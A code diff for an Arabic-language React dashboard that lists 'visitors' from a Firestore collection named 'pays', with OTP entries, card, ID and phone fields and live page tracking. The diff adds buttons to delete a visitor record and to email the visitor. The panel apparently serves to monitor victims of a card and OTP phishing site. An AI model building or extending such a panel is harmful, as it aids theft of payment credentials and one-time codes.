@@ -1,9 +1,20 @@
 import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
-import { collection, onSnapshot, query } from "firebase/firestore";
+import { collection, deleteDoc, doc, onSnapshot, query } from "firebase/firestore";
 import { db, onAuthChange, logoutUser } from "@/lib/firebase";
 import { Button } from "@/components/ui/button";
-import { User, CreditCard, Phone, Mail, IdCard, Calendar, CheckCircle, Clock, Volume2, LogOut, Users, TrendingUp, Eye, Shield, Car, DollarSign } from "lucide-react";
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogCancel,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
+import { toast } from "@/hooks/use-toast";
+import { User, CreditCard, Phone, Mail, IdCard, Calendar, Volume2, LogOut, Users, Eye, Shield, Car, DollarSign, Trash2, Send } from "lucide-react";
 
 interface OtpEntry {
   code: string;
@@ -86,6 +97,10 @@ export default function DashboardPage() {
   const [soundEnabled, setSoundEnabled] = useState(true);
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [checkingAuth, setCheckingAuth] = useState(true);
+  const [deleteDialogOpen, setDeleteDialogOpen] = useState(false);
+  const [deletingVisitorId, setDeletingVisitorId] = useState<string | null>(null);
+  const [sendMailDialogOpen, setSendMailDialogOpen] = useState(false);
+  const [sendingMail, setSendingMail] = useState(false);
   const audioRef = useRef<HTMLAudioElement | null>(null);
   const prevVisitorsCount = useRef(0);
 
@@ -104,6 +119,76 @@ export default function DashboardPage() {
   const handleLogout = async () => {
     await logoutUser();
     setLocation("/login");
+  };
+
+  const handleDeleteSelectedVisitor = async () => {
+    if (!db || !selectedVisitor) return;
+
+    const idToDelete = selectedVisitor.id;
+    const nextSelected =
+      (() => {
+        const idx = visitors.findIndex((v) => v.id === idToDelete);
+        return (idx >= 0 ? visitors[idx + 1] : undefined) ?? (idx > 0 ? visitors[idx - 1] : undefined) ?? null;
+      })();
+
+    setDeletingVisitorId(idToDelete);
+    try {
+      // Optimistically update UI so the detail panel never points at a deleted record.
+      setVisitors((prev) => prev.filter((v) => v.id !== idToDelete));
+      setSelectedVisitor((prevSelected) => (prevSelected?.id === idToDelete ? nextSelected : prevSelected));
+
+      await deleteDoc(doc(db, "pays", idToDelete));
+      setDeleteDialogOpen(false);
+    } catch (error) {
+      console.error("Error deleting visitor:", error);
+      // If deletion fails, rely on the Firestore snapshot to repopulate the list.
+    } finally {
+      setDeletingVisitorId(null);
+    }
+  };
+
+  const handleSendMailToSelectedVisitor = async () => {
+    if (!selectedVisitor?.email) {
+      toast({
+        title: "لا يوجد بريد إلكتروني",
+        description: "هذا الزائر لا يحتوي على بريد إلكتروني لإرسال الرسالة.",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    setSendingMail(true);
+    try {
+      const response = await fetch("/api/send-confirmation-email", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email: selectedVisitor.email,
+          name: selectedVisitor.name || "زائر",
+        }),
+      });
+
+      const payload = await response.json().catch(() => ({}));
+
+      if (!response.ok || payload?.success === false) {
+        throw new Error(payload?.error || "Failed to send email");
+      }
+
+      toast({
+        title: "تم الإرسال",
+        description: `تم إرسال البريد إلى ${selectedVisitor.email}`,
+      });
+      setSendMailDialogOpen(false);
+    } catch (error) {
+      console.error("Error sending mail:", error);
+      toast({
+        title: "فشل الإرسال",
+        description: "حدث خطأ أثناء إرسال البريد. حاول مرة أخرى.",
+        variant: "destructive",
+      });
+    } finally {
+      setSendingMail(false);
+    }
   };
 
   const playNotificationSound = () => {
@@ -328,6 +413,78 @@ export default function DashboardPage() {
                     {selectedVisitor.online ? "متصل الآن" : "غير متصل"} • {getPageNameArabic(selectedVisitor.currentPage)}
                   </p>
                 </div>
+              </div>
+              <div className="flex items-center gap-2">
+                <AlertDialog open={sendMailDialogOpen} onOpenChange={setSendMailDialogOpen}>
+                  <Button
+                    variant="outline"
+                    size="icon"
+                    onClick={() => setSendMailDialogOpen(true)}
+                    disabled={!selectedVisitor.email || sendingMail}
+                    title="إرسال بريد"
+                    data-testid="button-send-mail"
+                  >
+                    <Send className="w-4 h-4" />
+                  </Button>
+                  <AlertDialogContent dir="rtl">
+                    <AlertDialogHeader>
+                      <AlertDialogTitle>إرسال بريد للزائر؟</AlertDialogTitle>
+                      <AlertDialogDescription>
+                        سيتم إرسال رسالة إلى:{" "}
+                        <span className="font-medium text-foreground">
+                          {selectedVisitor.email || "---"}
+                        </span>
+                      </AlertDialogDescription>
+                    </AlertDialogHeader>
+                    <AlertDialogFooter className="gap-2 sm:gap-0">
+                      <AlertDialogCancel disabled={sendingMail}>إلغاء</AlertDialogCancel>
+                      <AlertDialogAction
+                        onClick={(e) => {
+                          e.preventDefault();
+                          void handleSendMailToSelectedVisitor();
+                        }}
+                        disabled={!selectedVisitor.email || sendingMail}
+                      >
+                        {sendingMail ? "جاري الإرسال..." : "إرسال"}
+                      </AlertDialogAction>
+                    </AlertDialogFooter>
+                  </AlertDialogContent>
+                </AlertDialog>
+              <AlertDialog open={deleteDialogOpen} onOpenChange={setDeleteDialogOpen}>
+                <Button
+                  variant="destructive"
+                  size="icon"
+                  onClick={() => setDeleteDialogOpen(true)}
+                  disabled={deletingVisitorId === selectedVisitor.id}
+                  title="حذف"
+                  data-testid="button-delete-visitor"
+                >
+                  <Trash2 className="w-4 h-4" />
+                </Button>
+                <AlertDialogContent dir="rtl">
+                  <AlertDialogHeader>
+                    <AlertDialogTitle>حذف الزائر؟</AlertDialogTitle>
+                    <AlertDialogDescription>
+                      سيتم حذف هذا السجل نهائيًا من لوحة التحكم ولا يمكن التراجع عن ذلك.
+                    </AlertDialogDescription>
+                  </AlertDialogHeader>
+                  <AlertDialogFooter className="gap-2 sm:gap-0">
+                    <AlertDialogCancel disabled={deletingVisitorId === selectedVisitor.id}>
+                      إلغاء
+                    </AlertDialogCancel>
+                    <AlertDialogAction
+                      onClick={(e) => {
+                        e.preventDefault();
+                        void handleDeleteSelectedVisitor();
+                      }}
+                      disabled={deletingVisitorId === selectedVisitor.id}
+                      className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
+                    >
+                      {deletingVisitorId === selectedVisitor.id ? "جاري الحذف..." : "حذف"}
+                    </AlertDialogAction>
+                  </AlertDialogFooter>
+                </AlertDialogContent>
+              </AlertDialog>
               </div>
             </div>
 
